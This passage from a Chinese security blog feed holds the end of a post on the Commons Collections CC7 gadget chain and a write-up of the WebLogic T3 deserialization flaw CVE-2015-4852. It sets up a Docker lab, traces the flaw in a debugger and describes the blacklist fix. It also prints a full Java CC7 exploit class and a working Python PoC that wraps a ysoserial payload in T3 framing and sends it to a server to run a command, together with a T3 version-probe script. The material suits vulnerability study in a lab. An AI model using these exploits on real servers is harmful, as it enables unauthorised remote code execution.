<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<h3 id="aCemO">在 map2 中remove掉 yy</h3>
<font style="color:rgb(80, 80, 92);">这是因为</font><font style="color:rgb(80, 80, 92);"> </font>`HashTable.put()`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">实际上也会调用到</font><font style="color:rgb(80, 80, 92);"> </font>`equals()`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">方法：</font>

<p><font style="color:rgb(80, 80, 92);">当调用完 </font><code>equals()</code><font style="color:rgb(80, 80, 92);"> 方法后，LazyMap2 的 key 中就会增加一个 yy 键：</font></p>
<h3 id="x6x4z"><font style="color:rgb(80, 80, 92);">put时弹计算器</font></h3>
虽然这不影响我们的序列化，但是总归是不好的，需要修改一下



<h2 id="xC9Rs">最终EXP</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.review;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804558818-e8d82acc-d43c-4a72-86fb-ee0723feb6ac.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804558818-e8d82acc-d43c-4a72-86fb-ee0723feb6ac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic T3 反序列化</title>
    <url>/2025/07/19/CVE-2015-4852WebLogicT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="LmPCK">CVE-2015-4852 WebLogic T3 反序列化分析</h1>
<h2 id="c9X1Z">前言</h2>

<p>之前见过好多次WebLogic的漏洞，但是一直没来得及学（其实是懒），这段时间有来学习一下</p>
<h2 id="a0gin">环境搭建</h2>
<h3 id="VPNEi">构建镜像</h3>
环境配置中JDK版本和Weblogic版本如下

<ul>
<li>JDK7u21</li>
<li>WebLogic1036</li>
</ul>
<p>环境的搭建使用 QAX A-team中提供的脚本：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment?tab=readme-ov-file">https://github.com/QAX-A-Team/WeblogicEnvironment?tab=readme-ov-file</a></p>
<p>JDK安装包下载地址：<a href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a></p>
<p>WebLogic安装包下载地址：<a href="http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar">http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar</a></p>
<p>下载好后，分别将JDK和WebLogic放入jdks和Weblogics文件夹下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751543486393-acd33e4d-d277-44bd-8b93-1777b3984793.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751543486393-acd33e4d-d277-44bd-8b93-1777b3984793.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后使用docker进行构建和运行，命令如下（我在运行时，一直启动不起来，通过查看日志发现，内存不够，因此添加了参数<code>--ulimit nofile=65536:65536 --ulimit nproc=4096</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//构建</span><br><span class="line">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</span><br><span class="line">//运行</span><br><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --ulimit nofile=65536:65536 --ulimit nproc=4096 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br><span class="line">2d9df0504ce2dbb7b1070db8bec8e6cd5596532c38a13a3d86d635562bf8f420</span><br></pre></td></tr></table></figure>

<p>这样我们的环境就搭建好了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751549724127-e5c3887e-9bb2-4a02-b8dc-43b43d5b363e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751549724127-e5c3887e-9bb2-4a02-b8dc-43b43d5b363e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="ZepLQ">远程调试</h3>

<p>如需远程调试，需要把一些weblogic的依赖Jar包给导出来才能进行远程调试。</p>
<p>可以使用该项目自带的脚本进行快速环境搭建并复制远程调试需要用到的目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x run_weblogic1036jdk7u21.sh</span><br><span class="line">./run_weblogic1036jdk7u21.sh</span><br><span class="line">//将/coherence_3.7/lib中的jar包也导出</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751550100020-da51eeaa-397d-4426-a670-878aea741a60.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751550100020-da51eeaa-397d-4426-a670-878aea741a60.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>将这两个文件夹传到我们的本机上，用IDEA打开wlserver文件夹，然后导入coherence_3.7&#x2F;lib和modules</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751552099741-1385b4ae-446f-4b29-9950-50ac00d1db60.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751552099741-1385b4ae-446f-4b29-9950-50ac00d1db60.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>再把 server&#x2F;lib 作为依赖进行导入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751551542509-0c0a5457-b850-4032-8d65-bbe580b69b79.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751551542509-0c0a5457-b850-4032-8d65-bbe580b69b79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在运行&#x2F;调试配置页面添加【远程JVM调试&#x2F;Remote】，并修改端口和JDK版本</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751551744123-9edf29af-fd52-419e-84d5-c9543caee45d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751551744123-9edf29af-fd52-419e-84d5-c9543caee45d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="d8uXa">基础知识</h2>
<h3 id="bjeeb">WebLogic</h3>

<p>Weblogic是一个基于JAVAEE架构的中间件，和Tomcat差不多，从功能上来说就是两个Web服务器，同时也是启动器。与Tomcat不同，Weblogic可以自己去部署很多东西，而Tomcat中都需要自己去写代码。</p>
<h3 id="dW8Ht">T3协议</h3>

<p>T3协议是WebLogic中独有的一个协议，在Weblogic中RMI通信中使用的就是T3协议，而原生的RMI通信使用的是JRMP协议。RMI通信中，被传输的是一串序列化的数据，在这串数据被接受后，会执行反序列化的操作。</p>
<p>T3协议的特点有以下两点：</p>
<ol>
<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常的心跳间隔是60秒，服务端在超过240秒未接收到心跳，即判定与客户端的连接丢失</li>
<li>通过建立一次连接，就可以将全部数据包传输完成，优化了数据包的大小和网络消耗</li>
</ol>
<p>在 T3 的这个协议里面包含请求包头和请求的主体这两部分内容</p>
<h4 id="wj2KX">请求包头</h4>

<p>请求包头的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001</span><br></pre></td></tr></table></figure>

<p>我们使用py脚本，向Weblogic发送一个请求包的头，看一看会返回什么内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.111.132&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure>

<p>用wireshark进行抓包，我们可以看到，在返回的内容中包含了webLogic的版本信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751551335575-d317c54d-5cb6-49c1-b785-0c24dbab0e34.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751551335575-d317c54d-5cb6-49c1-b785-0c24dbab0e34.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>因此我们可以通过发送WebLogic请求包头进行WebLogic的版本探测</p>
<h4 id="jsvrK">请求主体</h4>
T3协议包请求主体的结构如下，第一部分为非JAVA序列化数据部分

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751547854303-e967251d-2bf9-4eb8-bfe3-cbbb79f1e9e8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751547854303-e967251d-2bf9-4eb8-bfe3-cbbb79f1e9e8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>下图则为T3协议包的内容，可以看到，除了第一部分，第二部分到第七部分，开头都是<code>ac ed 00 05</code>，很明显的Java序列化数据的头部标识，那么只要将其中一部分替换为我们的恶意序列化数据，即可触发我们构造的恶意Payload。</p>
<p>存在以下两种替换的方式：</p>
<ol>
<li>将WebLogic发送的协议包中第二到第七部分Java序列化数据其中之一替换为恶意的序列化数据</li>
<li>将WebLogic发送的协议包中的第一部分与我们构造的恶意序列化数据进行拼接</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751547898586-9dfff95f-29ff-418c-a2e9-3f2386666958.jpeg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751547898586-9dfff95f-29ff-418c-a2e9-3f2386666958.jpeg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="zfFZu">漏洞复现</h2>

<p>weblogic 10.3.6 的包里面包含有 Commons Collections 3.2.0 的包，且我在搭建环境时，JDK环境版本为JDK7u21，因此这里可以用jdk7u21和cc1两条链，这里用创建文件的方式来检验反序列化是否成功</p>
<h3 id="dI6rq">Poc构造</h3>

<p>我们这里使用CC1的链子进行测试，Poc代码如下</p>
<p>我们只需要将头部信息与ysoserial生成的序列化数据进行拼接，然后发送给服务端即可（前四个字节要根据payload的总长度进行改变）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def weblogicExp(ip,port,payload):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot; #请求包的头</span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(1024)</span><br><span class="line">    compile = re.compile(&quot;HELO:(.*).0.false&quot;)</span><br><span class="line">    match = compile.findall(data.decode())</span><br><span class="line">    if match:</span><br><span class="line">        print(&quot;WebLogic：&quot; + str(match) )</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;NO WebLogic&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    header =  binascii.a2b_hex(b&quot;00000000&quot;)</span><br><span class="line">    t3Header = binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)</span><br><span class="line">    desflag = binascii.a2b_hex(b&quot;fe010000&quot;)</span><br><span class="line">    payload = header + t3Header + desflag + payload</span><br><span class="line"></span><br><span class="line">    payload = struct.pack(&quot;&gt;I&quot;,len(payload)) + payload[4:]</span><br><span class="line">    sock.sendall(payload)</span><br><span class="line"></span><br><span class="line">def getPayload(gadget,cmd):</span><br><span class="line">    ysoPath = &quot;ysoserial-all.jar&quot;</span><br><span class="line">    popen = subprocess.Popen([&#x27;java&#x27;,&#x27;-jar&#x27;,ysoPath,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    return popen.stdout.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    ip = &quot;192.168.111.128&quot;</span><br><span class="line">    port = 7001</span><br><span class="line">    gadget = &quot;CommonsCollections1&quot;</span><br><span class="line">    cmd = &quot;touch /tmp/success.txt&quot;</span><br><span class="line">    payload = getPayload(gadget,cmd)</span><br><span class="line">    weblogicExp(ip,port,payload)</span><br></pre></td></tr></table></figure>

<p>查看容器里的&#x2F;tmp目录，发现成功创建了success.txt文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec  weblogic1036jdk7u21 ls tmp/</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751554306106-bc318271-763f-4209-b76f-e789cee6f88e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751554306106-bc318271-763f-4209-b76f-e789cee6f88e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="tbaad">Poc理解</h3>

<p>PoC 本质就是把 ysoserial 生成的 payload 变成 T3 协议里的数据格式，我们需要写入的有几段东西。</p>
<ol>
<li>Header：代表了数据包的长度，需要根据数据包的变化而变化</li>
<li>T3 Header：T3协议的头部数据</li>
<li>反序列化标志：<code>fe 01 00 00</code></li>
</ol>
<p>因此数据包的构造如下，且要修改根据数据包长度去修改前四个字节</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">header =  binascii.a2b_hex(b&quot;00000000&quot;)</span><br><span class="line">t3Header = binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)</span><br><span class="line">desflag = binascii.a2b_hex(b&quot;fe010000&quot;)</span><br><span class="line">payload = header + t3Header + desflag + payload</span><br><span class="line"></span><br><span class="line">payload = struct.pack(&quot;&gt;I&quot;,len(payload)) + payload[4:]</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751554703976-0a171bbc-f2c0-4b4d-a26f-bbb00aabe6e1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751554703976-0a171bbc-f2c0-4b4d-a26f-bbb00aabe6e1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="f3Y4P">漏洞分析</h2>
<h3 id="kWPOH">影响版本</h3>

<p>Oracle WebLogic Server：</p>
<ul>
<li><font style="color:rgb(80, 80, 92);">10.3.6.0,</font></li>
<li><font style="color:rgb(80, 80, 92);">12.1.3.0,</font></li>
<li><font style="color:rgb(80, 80, 92);">12.2.1.2 </font></li>
<li><font style="color:rgb(80, 80, 92);">12.2.1.3</font></li>
</ul>
<h3 id="v5nMA"><font style="color:rgb(80, 80, 92);">代码调试</font></h3>
根据其他师傅的成果，可以知道反序列化的入口在`InboundMsgAbbrev#readObject`中，我们在该方法中下个断点进行调试

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> var1.read();</span><br><span class="line">    <span class="keyword">switch</span> (var2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ServerChannelInputStream</span>(var1)).readObject();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> var1.readASCII();</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Unknown typecode: &#x27;&quot;</span> + var2 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常情况下，我们的var2参数为0，会走到case为0的情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751594638012-03c4e281-d07a-4654-ae95-44ce23b3f541.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751594638012-03c4e281-d07a-4654-ae95-44ce23b3f541.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>ServerChannelInputStream</code> 这个类的作用是处理服务端收到的请求头信息</p>
<p><code>ServerChannelInputStream</code>继承自<code>ObjectInputStream</code>类，这里重写了<code>resolveClass</code>，但是实际上调用的还是父类<code>ObjectInputStream</code>的<code>resolveClass</code>方法，等于没有做任何防御，导致漏洞的出现</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751597584999-c6d13752-45c7-4c0c-8c44-6751dc158fcb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751597584999-c6d13752-45c7-4c0c-8c44-6751dc158fcb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>回到<code>InboundMsgAbbrev#readObject</code>， 一路跟进至<code>InboundMsgAbbrev#resolveClass()</code>中，这里的调用栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resolveClass:<span class="number">108</span>, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)</span><br><span class="line">readNonProxyDesc:<span class="number">1610</span>, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:<span class="number">1515</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1769</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br></pre></td></tr></table></figure>

<p><code>resolveClass</code>方法是用来处理类的，这些类在经过反序列化之后会走到<code>resolveClass()</code> 方法这里，这里的var1就是我们的<code>AnnotationInvocationHandler</code> 类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751598378667-7d13c9f1-02a1-40cd-a84e-5326ef8d5f32.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751598378667-7d13c9f1-02a1-40cd-a84e-5326ef8d5f32.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里的<code>AnnotationInvocationHandler</code>类并不会直接被拿去反序列化，因为WebLogic服务器要先加载所有反序列化的内容，在所有数据反序列化解析完成后，才会进行真正的反序列化（类的初始化会推迟到首次主动使用时，如调用 <code>obj.toString()</code>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = Class.forPrimitiveName(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>WebLogic中自带CommonCollections3.2.0的依赖，反序列化的点和gadget就都有了。我们只需要利用ysoserial生成<code>CommonsCollections1</code>的payload然后放到T3协议数据包力就可以了</p>
<h2 id="OFBFa">漏洞修复</h2>
<h3 id="ZylBg">CVE-2015-4852修复</h3>

<p>在前面的分析过程中，我们可以看到，加载类是通过<code>resolveClass</code>方法，再通过反射获取到任意类，因此官方选择了基于<code>resolveCLass</code>的黑名单校验</p>
<p>在<code>resolveClass</code>处加一个过滤，如果匹配到了黑名单里面的类就会抛出异常，无法完成反序列化操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751599382118-e685b10a-e01b-4c4d-8b26-bfb84846926b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751599382118-e685b10a-e01b-4c4d-8b26-bfb84846926b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在开放在外网的情况下，除了通过重写resolve进行黑名单校验的方法，还可以去采用以下两种方法：</p>
<ol>
<li>web代理：web代理的方式只能通过转发HTTP请求，而不会转发T3协议的请求</li>
<li>负载均衡：在负载均衡的情况下，可以指定需要进行负载均衡的协议类型，那么这里就可以设置为HTTP的请求，不接收其他的协议请求转发。这也是在外网中见到T3协议漏洞比较少的原因之一。</li>
</ol>
<h3 id="KJyd6">resolveClass的作用</h3>

<p><code>resolve</code>方法的作用是将类的序列化描述符加工成该类的Class对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751599650863-515fe800-a63b-474f-ae51-0612379d6e0f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751599650863-515fe800-a63b-474f-ae51-0612379d6e0f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
